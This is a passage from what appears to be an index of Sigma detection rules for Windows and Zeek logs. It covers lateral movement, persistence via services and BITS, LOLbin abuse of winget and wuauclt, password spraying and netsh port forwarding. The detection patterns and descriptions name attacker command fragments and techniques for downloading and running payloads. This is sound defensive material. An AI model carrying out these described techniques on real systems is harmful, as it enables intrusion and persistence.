description: \u0026#39;Windows DCE-RPC functions which indicate an execution techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE\u0026#39; author: \u0026#39;@neu5ron, SOC Prime\u0026#39; references: - https://github.com/mitre-attack/bzar#indicators-for-attck-execution date: 2020/03/19 modified: 2021/11/27 logsource: product: zeek service: dce_rpc detection: op1: endpoint: \u0026#39;JobAdd\u0026#39; operation: \u0026#39;atsvc\u0026#39; op2: endpoint: \u0026#39;ITaskSchedulerService\u0026#39; operation: \u0026#39;SchRpcEnableTask\u0026#39; op3: endpoint: \u0026#39;ITaskSchedulerService\u0026#39; operation: \u0026#39;SchRpcRegisterTask\u0026#39; op4: endpoint: \u0026#39;ITaskSchedulerService\u0026#39; operation: \u0026#39;SchRpcRun\u0026#39; op5: endpoint: \u0026#39;IWbemServices\u0026#39; operation: \u0026#39;ExecMethod\u0026#39; op6: endpoint: \u0026#39;IWbemServices\u0026#39; operation: \u0026#39;ExecMethodAsync\u0026#39; op7: endpoint: \u0026#39;svcctl\u0026#39; operation: \u0026#39;CreateServiceA\u0026#39; op8: endpoint: \u0026#39;svcctl\u0026#39; operation: \u0026#39;CreateServiceW\u0026#39; op9: endpoint: \u0026#39;svcctl\u0026#39; operation: \u0026#39;StartServiceA\u0026#39; op10: endpoint: \u0026#39;svcctl\u0026#39; operation: \u0026#39;StartServiceW\u0026#39; condition: 1 of op* falsepositives: - \u0026#39;Windows administrator tasks or troubleshooting\u0026#39; - \u0026#39;Windows management scripts or software\u0026#39; level: medium tags: - attack.execution - attack.t1047 - attack.t1053.002 - attack.t1569.002 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_dce_rpc_mitre_bzar_execution.yml/","tags":["attack.execution","attack.t1047","attack.t1053.002","attack.t1569.002"],"title":"MITRE BZAR Indicators for Execution"},{"categories":null,"contents":"Windows DCE-RPC functions which indicate a persistence techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE.\nKnown false-positives Windows administrator tasks or troubleshooting Windows management scripts or software References https://github.com/mitre-attack/bzar#indicators-for-attck-persistence Raw rule (edit) title: MITRE BZAR Indicators for Persistence id: 53389db6-ba46-48e3-a94c-e0f2cefe1583 status: test description: \u0026#39;Windows DCE-RPC functions which indicate a persistence techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE.\u0026#39; author: \u0026#39;@neu5ron, SOC Prime\u0026#39; references: - https://github.com/mitre-attack/bzar#indicators-for-attck-persistence date: 2020/03/19 modified: 2021/11/27 logsource: product: zeek service: dce_rpc detection: op1: endpoint: \u0026#39;spoolss\u0026#39; operation: \u0026#39;RpcAddMonitor\u0026#39; op2: endpoint: \u0026#39;spoolss\u0026#39; operation: \u0026#39;RpcAddPrintProcessor\u0026#39; op3: endpoint: \u0026#39;IRemoteWinspool\u0026#39; operation: \u0026#39;RpcAsyncAddMonitor\u0026#39; op4: endpoint: \u0026#39;IRemoteWinspool\u0026#39; operation: \u0026#39;RpcAsyncAddPrintProcessor\u0026#39; op5: endpoint: \u0026#39;ISecLogon\u0026#39; operation: \u0026#39;SeclCreateProcessWithLogonW\u0026#39; op6: endpoint: \u0026#39;ISecLogon\u0026#39; operation: \u0026#39;SeclCreateProcessWithLogonExW\u0026#39; condition: 1 of op* falsepositives: - \u0026#39;Windows administrator tasks or troubleshooting\u0026#39; - \u0026#39;Windows management scripts or software\u0026#39; level: medium tags: - attack.persistence - attack.t1547.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/network/zeek/zeek_dce_rpc_mitre_bzar_persistence.yml/","tags":["attack.persistence","attack.t1547.004"],"title":"MITRE BZAR Indicators for Persistence"},{"categories":null,"contents":"Detects MMC20.Application Lateral Movement; specifically looks for the spawning of the parent MMC.exe with a command line of \u0026ldquo;-Embedding\u0026rdquo; as a child of svchost.exe\nKnown false-positives Unlikely References https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/ https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view?usp=sharing Raw rule (edit) title: MMC20 Lateral Movement id: f1f3bf22-deb2-418d-8cce-e1a45e46a5bd status: test description: Detects MMC20.Application Lateral Movement; specifically looks for the spawning of the parent MMC.exe with a command line of \u0026#34;-Embedding\u0026#34; as a child of svchost.exe author: \u0026#39;@2xxeformyshirt (Security Risk Advisors) - rule; Teymur Kheirkhabarov (idea)\u0026#39; references: - https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/ - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view?usp=sharing date: 2020/03/04 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\svchost.exe\u0026#39; Image|endswith: \u0026#39;\\mmc.exe\u0026#39; CommandLine|contains: \u0026#39;-Embedding\u0026#39; condition: selection falsepositives: - Unlikely level: high tags: - attack.execution - attack.t1021.003 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_mmc20_lateral_movement.yml/","tags":["attack.execution","attack.t1021.003"],"title":"MMC20 Lateral Movement"},{"categories":null,"contents":"Detects modification of an existing service on a compromised host in order to execute an arbitrary payload when the service is started or killed as a method of persistence.\nKnown false-positives unknown References https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/ Raw rule (edit) title: Modification Of Existing Services For Persistence id: 38879043-7e1e-47a9-8d46-6bec88e201df description: Detects modification of an existing service on a compromised host in order to execute an arbitrary payload when the service is started or killed as a method of persistence. references: - https://pentestlab.blog/2020/01/22/persistence-modify-existing-service/ status: experimental tags: - attack.persistence - attack.t1543.003 - attack.t1574.011 author: Sreeman date: 2020/09/29 modified: 2022/03/06 logsource: category: process_creation product: windows detection: selection_cmdline_1: CommandLine|contains|all: - \u0026#39;sc \u0026#39; - \u0026#39;config \u0026#39; - \u0026#39;binpath=\u0026#39; selection_cmdline_2: CommandLine|contains|all: - \u0026#39;sc \u0026#39; - \u0026#39;failure\u0026#39; - \u0026#39;command=\u0026#39; selection_cmdline_3: CommandLine|contains|all: - \u0026#39;reg \u0026#39; - \u0026#39;add \u0026#39; - \u0026#39;FailureCommand\u0026#39; CommandLine|contains: - \u0026#39;.sh\u0026#39; - \u0026#39;.exe\u0026#39; - \u0026#39;.dll\u0026#39; - \u0026#39;.bin$\u0026#39; - \u0026#39;.bat\u0026#39; - \u0026#39;.cmd\u0026#39; - \u0026#39;.js\u0026#39; - \u0026#39;.msh$\u0026#39; - \u0026#39;.reg$\u0026#39; - \u0026#39;.scr\u0026#39; - \u0026#39;.ps\u0026#39; - \u0026#39;.vb\u0026#39; - \u0026#39;.jar\u0026#39; - \u0026#39;.pl\u0026#39; selection_cmdline_4: CommandLine|contains|all: - \u0026#39;reg \u0026#39; - \u0026#39;add \u0026#39; - \u0026#39;ImagePath\u0026#39; CommandLine|contains: - \u0026#39;.sh\u0026#39; - \u0026#39;.exe\u0026#39; - \u0026#39;.dll\u0026#39; - \u0026#39;.bin$\u0026#39; - \u0026#39;.bat\u0026#39; - \u0026#39;.cmd\u0026#39; - \u0026#39;.js\u0026#39; - \u0026#39;.msh$\u0026#39; - \u0026#39;.reg$\u0026#39; - \u0026#39;.scr\u0026#39; - \u0026#39;.ps\u0026#39; - \u0026#39;.vb\u0026#39; - \u0026#39;.jar\u0026#39; - \u0026#39;.pl\u0026#39; condition: 1 of selection_cmdline_* falsepositives: - unknown level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_modif_of_services_for_via_commandline.yml/","tags":["attack.persistence","attack.t1543.003","attack.t1574.011"],"title":"Modification Of Existing Services For Persistence"},{"categories":null,"contents":"Detects the import of an alternate data stream with regini.exe, regini.exe can be used to modify registry keys.\nKnown false-positives Unknown References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regini.yml https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regini Raw rule (edit) title: Modifies the Registry From a ADS id: 77946e79-97f1-45a2-84b4-f37b5c0d8682 status: experimental description: Detects the import of an alternate data stream with regini.exe, regini.exe can be used to modify registry keys. references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regini.yml - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regini tags: - attack.t1112 - attack.defense_evasion author: Eli Salem, Sander Wiebing, oscd.community date: 2020/10/12 modified: 2021/05/24 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\regini.exe\u0026#39; CommandLine|re: \u0026#39;:[^ \\\\\\\\]\u0026#39; condition: selection fields: - ParentImage - CommandLine falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_regini_ads.yml/","tags":["attack.t1112","attack.defense_evasion"],"title":"Modifies the Registry From a ADS"},{"categories":null,"contents":"Detects the execution of regini.exe which can be used to modify registry keys, the changes are imported from one or more text files.\nKnown false-positives Legitimate modification of keys References https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regini.yml https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regini Raw rule (edit) title: Modifies the Registry From a File id: 5f60740a-f57b-4e76-82a1-15b6ff2cb134 status: experimental description: Detects the execution of regini.exe which can be used to modify registry keys, the changes are imported from one or more text files. references: - https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Regini.yml - https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f - https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regini tags: - attack.t1112 - attack.defense_evasion author: Eli Salem, Sander Wiebing, oscd.community date: 2020/10/08 modified: 2021/05/24 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\regini.exe\u0026#39; filter: CommandLine|re: \u0026#39;:[^ \\\\\\\\]\u0026#39; # to avoid intersection with ADS rule condition: selection and not filter fields: - ParentImage - CommandLine falsepositives: - Legitimate modification of keys level: low ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_regini.yml/","tags":["attack.t1112","attack.defense_evasion"],"title":"Modifies the Registry From a File"},{"categories":null,"contents":"BITS will allow you to schedule a command to execute after a successful download to notify you that the job is finished. When the job runs on the system the command specified in the BITS job will be executed. This can be abused by actors to create a backdoor within the system and for persistence. It will be chained in a BITS job to schedule the download of malware/additional binaries and execute the program after being downloaded\nKnown false-positives None observed yet. References https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394 Raw rule (edit) title: Monitoring For Persistence Via BITS id: b9cbbc17-d00d-4e3d-a827-b06d03d2380d description: BITS will allow you to schedule a command to execute after a successful download to notify you that the job is finished. When the job runs on the system the command specified in the BITS job will be executed. This can be abused by actors to create a backdoor within the system and for persistence. It will be chained in a BITS job to schedule the download of malware/additional binaries and execute the program after being downloaded status: experimental author: Sreeman date: 2020/10/29 modified: 2022/03/07 references: - https://www.fireeye.com/blog/threat-research/2020/10/kegtap-and-singlemalt-with-a-ransomware-chaser.html - http://0xthem.blogspot.com/2014/03/t-emporal-persistence-with-and-schtasks.html - https://isc.sans.edu/diary/Wipe+the+drive+Stealthy+Malware+Persistence+Mechanism+-+Part+1/15394 logsource: product: windows category: process_creation detection: selection_1: CommandLine|contains|all: - \u0026#39;bitsadmin\u0026#39; - \u0026#39;/SetNotifyCmdLine\u0026#39; CommandLine|contains: - \u0026#39;%COMSPEC%\u0026#39; - \u0026#39;cmd.exe\u0026#39; - \u0026#39;regsvr32.exe\u0026#39; selection_2: CommandLine|contains|all: - \u0026#39;bitsadmin\u0026#39; - \u0026#39;/Addfile\u0026#39; CommandLine|contains: - \u0026#39;http:\u0026#39; - \u0026#39;https:\u0026#39; - \u0026#39;ftp:\u0026#39; - \u0026#39;ftps:\u0026#39; condition: 1 of selection_* falsepositives: - None observed yet. fields: - CommandLine level: medium tags: - attack.defense_evasion - attack.t1197 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_monitoring_for_persistence_via_bits.yml/","tags":["attack.defense_evasion","attack.t1197"],"title":"Monitoring For Persistence Via BITS"},{"categories":null,"contents":"Adversaries can abuse winget to download payloads remotely and execute them without touching disk. Winget will be included by default in Windows 10 and is already available in Windows 10 insider programs. The manifest option enables you to install an application by passing in a YAML file directly to the client. Winget can be used to download and install exe\u0026rsquo;s, msi, msix files later.\nKnown false-positives Admin activity installing packages not in the official Microsoft repo. Winget probably won\u0026rsquo;t be used by most users. References https://docs.microsoft.com/en-us/windows/package-manager/winget/install#local-install Raw rule (edit) title: Monitoring Winget For LOLbin Execution id: 313d6012-51a0-4d93-8dfc-de8553239e25 description: Adversaries can abuse winget to download payloads remotely and execute them without touching disk. Winget will be included by default in Windows 10 and is already available in Windows 10 insider programs. The manifest option enables you to install an application by passing in a YAML file directly to the client. Winget can be used to download and install exe\u0026#39;s, msi, msix files later. status: experimental references: - https://docs.microsoft.com/en-us/windows/package-manager/winget/install#local-install author: Sreeman, Florian Roth, Frack113 date: 2020/04/21 modified: 2022/01/11 tags: - attack.defense_evasion - attack.execution - attack.t1059 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - \u0026#39;winget\u0026#39; - \u0026#39;install\u0026#39; CommandLine|contains: - \u0026#39;-m \u0026#39; - \u0026#39;--manifest\u0026#39; condition: selection falsepositives: - Admin activity installing packages not in the official Microsoft repo. Winget probably won\u0026#39;t be used by most users. fields: - CommandLine level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lolbin_execution_via_winget.yml/","tags":["attack.defense_evasion","attack.execution","attack.t1059"],"title":"Monitoring Winget For LOLbin Execution"},{"categories":null,"contents":"Adversaries can abuse wuauclt.exe (Windows Update client) to run code execution by specifying an arbitrary DLL.\nKnown false-positives Wuaueng.dll which is a module belonging to Microsoft Windows Update. References https://dtm.uk/wuauclt/ Raw rule (edit) title: Monitoring Wuauclt.exe For Lolbas Execution Of DLL id: ba1bb0cb-73da-42de-ad3a-de10c643a5d0 status: experimental description: Adversaries can abuse wuauclt.exe (Windows Update client) to run code execution by specifying an arbitrary DLL. references: - https://dtm.uk/wuauclt/ author: Sreeman date: 2020/10/29 modified: 2022/03/07 logsource: product: windows category: process_creation detection: selection: CommandLine|contains|all: - \u0026#39;wuauclt.exe\u0026#39; - \u0026#39;/UpdateDeploymentProvider\u0026#39; - \u0026#39;/Runhandlercomserver\u0026#39; filter: CommandLine|contains: - \u0026#39;wuaueng.dll\u0026#39; - \u0026#39;UpdateDeploymentProvider.dll /ClassId\u0026#39; condition: selection and not filter falsepositives: - Wuaueng.dll which is a module belonging to Microsoft Windows Update. fields: - CommandLine level: medium tags: - attack.defense_evasion - attack.execution - attack.t1218.011 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_lolbas_execution_of_wuauclt.yml/","tags":["attack.defense_evasion","attack.execution","attack.t1218.011"],"title":"Monitoring Wuauclt.exe For Lolbas Execution Of DLL"},{"categories":null,"contents":"Detects the use of Moriya rootkit as described in the securelist\u0026rsquo;s Operation TunnelSnake report\nKnown false-positives None References https://securelist.com/operation-tunnelsnake-and-moriya-rootkit/101831 Raw rule (edit) title: Moriya Rootkit id: 25b9c01c-350d-4b95-bed1-836d04a4f324 description: Detects the use of Moriya rootkit as described in the securelist\u0026#39;s Operation TunnelSnake report status: experimental author: Bhabesh Raj date: 2021/05/06 modified: 2021/11/30 references: - https://securelist.com/operation-tunnelsnake-and-moriya-rootkit/101831 tags: - attack.persistence - attack.privilege_escalation - attack.t1543.003 logsource: product: windows service: system detection: selection: Provider_Name: \u0026#39;Service Control Manager\u0026#39; EventID: 7045 ServiceName: ZzNetSvc condition: selection level: critical falsepositives: - None ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/system/win_moriya_rootkit.yml/","tags":["attack.persistence","attack.privilege_escalation","attack.t1543.003"],"title":"Moriya Rootkit"},{"categories":null,"contents":"Detects when when a mounted share is removed. Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation\nKnown false-positives Administrators or Power users may remove their shares via cmd line References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.005/T1070.005.md Raw rule (edit) title: Mounted Share Deleted id: cb7c4a03-2871-43c0-9bbb-18bbdb079896 status: test description: Detects when when a mounted share is removed. Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation author: \u0026#39;oscd.community, @redcanary, Zach Stanford @svch0st\u0026#39; references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1070.005/T1070.005.md date: 2020/10/08 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\net.exe\u0026#39; Image|endswith: \u0026#39;\\net1.exe\u0026#39; CommandLine|contains|all: - \u0026#39;share\u0026#39; - \u0026#39;/delete\u0026#39; condition: selection falsepositives: - Administrators or Power users may remove their shares via cmd line level: low tags: - attack.defense_evasion - attack.t1070.005 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_susp_mounted_share_deletion.yml/","tags":["attack.defense_evasion","attack.t1070.005"],"title":"Mounted Share Deleted"},{"categories":null,"contents":"Detects when an admin share is mounted using net.exe\nKnown false-positives Administrators References https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view Raw rule (edit) title: Mounted Windows Admin Shares with net.exe id: 3abd6094-7027-475f-9630-8ab9be7b9725 status: experimental description: Detects when an admin share is mounted using net.exe references: - https://drive.google.com/file/d/1lKya3_mLnR3UQuCoiYruO3qgu052_iS_/view author: \u0026#39;oscd.community, Teymur Kheirkhabarov @HeirhabarovT, Zach Stanford @svch0st, wagga\u0026#39; date: 2020/10/05 modified: 2021/06/27 tags: - attack.lateral_movement - attack.t1021.002 logsource: category: process_creation product: windows detection: selection: Image|endswith: - \u0026#39;\\net.exe\u0026#39; - \u0026#39;\\net1.exe\u0026#39; CommandLine|contains|all: - \u0026#39; use \u0026#39; - \u0026#39;\\\\\\*\\\\*$\u0026#39; # (Specs) If some wildcard after a backslash should be searched, the backslash has to be escaped: \\\\* condition: selection falsepositives: - Administrators level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_net_use_admin_share.yml/","tags":["attack.lateral_movement","attack.t1021.002"],"title":"Mounted Windows Admin Shares with net.exe"},{"categories":null,"contents":"Detects an executable in the users directory started from Microsoft Word, Excel, Powerpoint, Publisher or Visio\nKnown false-positives unknown References sha256=23160972c6ae07f740800fa28e421a81d7c0ca5d5cab95bc082b4a986fbac57c https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign Raw rule (edit) title: MS Office Product Spawning Exe in User Dir id: aa3a6f94-890e-4e22-b634-ffdfd54792cc status: experimental description: Detects an executable in the users directory started from Microsoft Word, Excel, Powerpoint, Publisher or Visio references: - sha256=23160972c6ae07f740800fa28e421a81d7c0ca5d5cab95bc082b4a986fbac57c - https://blog.morphisec.com/fin7-not-finished-morphisec-spots-new-campaign tags: - attack.execution - attack.t1204.002 - attack.g0046 - car.2013-05-002 author: Jason Lynch date: 2019/04/02 modified: 2021/04/01 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: - \u0026#39;\\WINWORD.EXE\u0026#39; - \u0026#39;\\EXCEL.EXE\u0026#39; - \u0026#39;\\POWERPNT.exe\u0026#39; - \u0026#39;\\MSPUB.exe\u0026#39; - \u0026#39;\\VISIO.exe\u0026#39; # - \u0026#39;\\OUTLOOK.EXE\u0026#39; too many FPs Image|startswith: \u0026#39;C:\\users\\\u0026#39; Image|endswith: \u0026#39;.exe\u0026#39; filter: Image|endswith: \u0026#39;\\Teams.exe\u0026#39; condition: selection and not filter fields: - CommandLine - ParentCommandLine falsepositives: - unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_office_spawn_exe_from_users_directory.yml/","tags":["attack.execution","attack.t1204.002","attack.g0046","car.2013-05-002"],"title":"MS Office Product Spawning Exe in User Dir"},{"categories":null,"contents":"Detects the Installation of a Exchange Transport Agent\nKnown false-positives legitimate installations of exchange TransportAgents. AssemblyPath is a good indicator for this. References https://twitter.com/blueteamsec1/status/1401290874202382336?s=20 Raw rule (edit) title: MSExchange Transport Agent Installation id: 83809e84-4475-4b69-bc3e-4aad8568612f status: experimental description: Detects the Installation of a Exchange Transport Agent references: - https://twitter.com/blueteamsec1/status/1401290874202382336?s=20 tags: - attack.persistence - attack.t1505.002 author: Tobias Michalski date: 2021/06/08 modified: 2021/09/19 logsource: product: windows category: process_creation detection: selection: CommandLine|contains: \u0026#39;Install-TransportAgent\u0026#39; condition: selection falsepositives: - legitimate installations of exchange TransportAgents. AssemblyPath is a good indicator for this. level: medium fields: - AssemblyPath ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_win_exchange_transportagent.yml/","tags":["attack.persistence","attack.t1505.002"],"title":"MSExchange Transport Agent Installation"},{"categories":null,"contents":"Detects a suspicious child process of a mshta.exe process\nKnown false-positives Unknown References https://app.any.run/tasks/f0fac90f-84ac-4faa-b5b2-f4353c388969/# https://app.any.run/tasks/9c0f37bc-867a-4314-b685-e101566766d7/ Raw rule (edit) title: Mshta Spawning Windows Shell id: 772bb24c-8df2-4be0-9157-ae4dfa794037 status: experimental description: Detects a suspicious child process of a mshta.exe process references: - https://app.any.run/tasks/f0fac90f-84ac-4faa-b5b2-f4353c388969/# - https://app.any.run/tasks/9c0f37bc-867a-4314-b685-e101566766d7/ author: Florian Roth date: 2021/06/28 tags: - attack.execution - attack.defense_evasion - attack.t1059.005 - attack.t1059.001 - attack.t1218 logsource: category: process_creation product: windows detection: selection: ParentImage|endswith: \u0026#39;\\mshta.exe\u0026#39; Image|endswith: - \u0026#39;\\powershell.exe\u0026#39; - \u0026#39;\\cmd.exe\u0026#39; - \u0026#39;\\WScript.exe\u0026#39; condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: high ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_shell_spawn_mshta.yml/","tags":["attack.execution","attack.defense_evasion","attack.t1059.005","attack.t1059.001","attack.t1218"],"title":"Mshta Spawning Windows Shell"},{"categories":null,"contents":"Detects a source user failing to authenticate with multiple users using explicit credentials on a host.\nKnown false-positives Terminal servers Jump servers Other multiuser systems like Citrix server farms Workstations with frequently changing users References https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying Raw rule (edit) title: Multiple Users Attempting To Authenticate Using Explicit Credentials id: 196a29c2-e378-48d8-ba07-8a9e61f7fab9 description: Detects a source user failing to authenticate with multiple users using explicit credentials on a host. status: experimental author: Mauricio Velazco date: 2021/06/01 modified: 2021/08/09 references: - https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying tags: - attack.t1110.003 - attack.initial_access - attack.privilege_escalation logsource: product: windows service: security detection: selection1: EventID: 4648 timeframe: 24h condition: - selection1 | count(Account_Name) by ComputerName \u0026gt; 10 falsepositives: - Terminal servers - Jump servers - Other multiuser systems like Citrix server farms - Workstations with frequently changing users level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_failed_logons_explicit_credentials.yml/","tags":["attack.t1110.003","attack.initial_access","attack.privilege_escalation"],"title":"Multiple Users Attempting To Authenticate Using Explicit Credentials"},{"categories":null,"contents":"Detects failed logins with multiple accounts from a single process on the system.\nKnown false-positives Terminal servers Jump servers Other multiuser systems like Citrix server farms Workstations with frequently changing users References https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying https://www.trimarcsecurity.com/single-post/2018/05/06/trimarc-research-detecting-password-spraying-with-security-event-auditing Raw rule (edit) title: Multiple Users Failing to Authenticate from Single Process id: fe563ab6-ded4-4916-b49f-a3a8445fe280 description: Detects failed logins with multiple accounts from a single process on the system. status: experimental author: Mauricio Velazco date: 2021/06/01 modified: 2021/07/07 references: - https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying - https://www.trimarcsecurity.com/single-post/2018/05/06/trimarc-research-detecting-password-spraying-with-security-event-auditing tags: - attack.t1110.003 - attack.initial_access - attack.privilege_escalation logsource: product: windows service: security detection: selection1: EventID: 4625 LogonType: 2 filter: ProcessName: \u0026#39;-\u0026#39; timeframe: 24h condition: - selection1 and not filter | count(TargetUserName) by ProcessName \u0026gt; 10 falsepositives: - Terminal servers - Jump servers - Other multiuser systems like Citrix server farms - Workstations with frequently changing users level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_failed_logons_single_process.yml/","tags":["attack.t1110.003","attack.initial_access","attack.privilege_escalation"],"title":"Multiple Users Failing to Authenticate from Single Process"},{"categories":null,"contents":"Detects a source system failing to authenticate against a remote host with multiple users.\nKnown false-positives Terminal servers Jump servers Other multiuser systems like Citrix server farms Workstations with frequently changing users References https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying Raw rule (edit) title: Multiple Users Remotely Failing To Authenticate From Single Source id: add2ef8d-dc91-4002-9e7e-f2702369f53a description: Detects a source system failing to authenticate against a remote host with multiple users. status: experimental author: Mauricio Velazco references: - https://docs.splunk.com/Documentation/ESSOC/3.22.0/stories/UseCase#Active_directory_password_spraying date: 2021/06/01 modified: 2021/07/09 tags: - attack.t1110.003 - attack.initial_access - attack.privilege_escalation logsource: product: windows service: security detection: selection1: EventID: 4625 LogonType: 3 filter: IpAddress: \u0026#39;-\u0026#39; timeframe: 24h condition: - selection1 and not filter | count(TargetUserName) by IpAddress \u0026gt; 10 falsepositives: - Terminal servers - Jump servers - Other multiuser systems like Citrix server farms - Workstations with frequently changing users level: medium ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/builtin/security/win_susp_failed_remote_logons_single_source.yml/","tags":["attack.t1110.003","attack.initial_access","attack.privilege_escalation"],"title":"Multiple Users Remotely Failing To Authenticate From Single Source"},{"categories":null,"contents":"Adversaries may modify system firewalls in order to bypass controls limiting network usage\nKnown false-positives Legitimate administration References https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md#atomic-test-3---allow-smb-and-rdp-on-microsoft-defender-firewall https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/netsh-advfirewall-firewall-control-firewall-behavior Raw rule (edit) title: Netsh Allow Group Policy on Microsoft Defender Firewall id: 347906f3-e207-4d18-ae5b-a9403d6bcdef status: experimental description: Adversaries may modify system firewalls in order to bypass controls limiting network usage author: frack113 references: - https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1562.004/T1562.004.md#atomic-test-3---allow-smb-and-rdp-on-microsoft-defender-firewall - https://docs.microsoft.com/en-us/troubleshoot/windows-server/networking/netsh-advfirewall-firewall-control-firewall-behavior date: 2022/01/09 logsource: category: process_creation product: windows detection: selection: Image|endswith: \u0026#39;\\netsh.exe\u0026#39; CommandLine|contains|all: - advfirewall - firewall - set - rule - \u0026#39;group=\u0026#39; - new - \u0026#39;enable=Yes\u0026#39; condition: selection falsepositives: - Legitimate administration level: medium tags: - attack.defense_evasion - attack.t1562.004 ","permalink":"https://bradleyjkemp.dev/sigmadoc/rules/windows/process_creation/proc_creation_win_netsh_fw_enable_group_rule.yml/","tags":["attack.defense_evasion","attack.t1562.004"],"title":"Netsh Allow Group Policy on Microsoft Defender Firewall"},{"categories":null,"contents":"Detects netsh commands that configure a port forwarding (PortProxy)\nKnown false-positives Legitimate administration WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. https://github.com/microsoft/WSL/issues/4150#issuecomment-504209723) References https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html https://adepts.of0x.cc/netsh-portproxy-code/ https://www.dfirnotes.net/portproxy_detection/ Raw rule (edit) title: Netsh Port Forwarding id: 322ed9ec-fcab-4f67-9a34-e7c6aef43614 description: Detects netsh commands that configure a port forwarding (PortProxy) references: - https://www.fireeye.com/blog/threat-research/2019/01/bypassing-network-restrictions-through-rdp-tunneling.html - https://adepts.of0x.cc/netsh-portproxy-code/ - https://www.dfirnotes.net/portproxy_detection/ date: 2019/01/29 modified: 2021/06/22 tags: - attack.lateral_movement - attack.defense_evasion - attack.command_and_control - attack.t1090 status: experimental author: Florian Roth, omkar72, oscd.community logsource: category: process_creation product: windows detection: selection1: Image|endswith: \u0026#39;\\netsh.exe\u0026#39; CommandLine|contains|all: - \u0026#39;interface\u0026#39; - \u0026#39;portproxy\u0026#39; - \u0026#39;add\u0026#39; - \u0026#39;v4tov4\u0026#39; selection2: Image|endswith: \u0026#39;\\netsh.exe\u0026#39; CommandLine|contains|all: - \u0026#39;connectp\u0026#39; - \u0026#39;listena\u0026#39; - \u0026#39;c=\u0026#39; condition: selection1 or selection2 falsepositives: - Legitimate administration - WSL2 network bridge PowerShell script used for WSL/Kubernetes/Docker (e.g. https://github.com/microsoft/WSL/issues/4150#issuecomment-504209723) level: medium 